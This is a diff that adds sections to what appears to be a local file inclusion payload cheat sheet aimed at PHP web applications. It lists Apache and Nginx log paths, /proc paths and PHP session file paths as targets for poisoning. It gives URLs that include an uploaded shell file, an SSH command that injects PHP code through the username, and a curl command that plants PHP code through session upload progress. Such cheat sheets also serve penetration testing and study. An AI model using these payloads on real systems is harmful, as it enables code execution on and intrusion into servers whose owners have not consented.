@@ -58,3 +58,61 @@ http://example.com/index.php?page=php://fd/[0-9] (Opened Files In Current Proces
 ```
 http://example.com/index.php?page=zip://path-to-zip-file/%23shell.php
 ```
+
+# Web Serice Software logs Poisoning
+
+**Apache2**
+
+```
+/var/log/apache2/access.log
+/var/log/apache/access.log
+/var/log/apache2/error.log
+/var/log/apache/error.log
+/usr/local/apache/log/error_log
+/usr/local/apache2/log/error_log
+/var/log/httpd/error_log
+```
+
+**Nginx**
+
+```
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+```
+
+# Process Poisoning
+
+```
+/proc/self/environ
+/proc/self/status
+/proc/[id]/fd/[id]
+/proc/self/[id]
+```
+
+# LFI to RCE via uploaded file
+
+```
+http://example.com/index.php?page=./uploads/shell.png
+```
+
+# SSH log Poisoning
+
+```
+$ ssh '<?php phpinfo(); ?>@example.com'
+http://example.com/index.php?page=/var/log/auth.log
+```
+
+# PHP Session Poisoning
+
+```
+ /var/lib/php/sess_[PHPSESSID]
+/tmp/sess_[PHPSESSID]
+/var/lib/php/sessions/sess_[PHPSESSID]
+```
+
+# PHP session.upload_progress 
+
+```
+curl --cookie "PHPSESSID=attacker" -F "PHP_SESSION_UPLOAD_PROGRESS=<?php phpinfo(); ?>" -F "file=@test.png"
+#then view session path like /var/lib/php/sess_attacker
+```
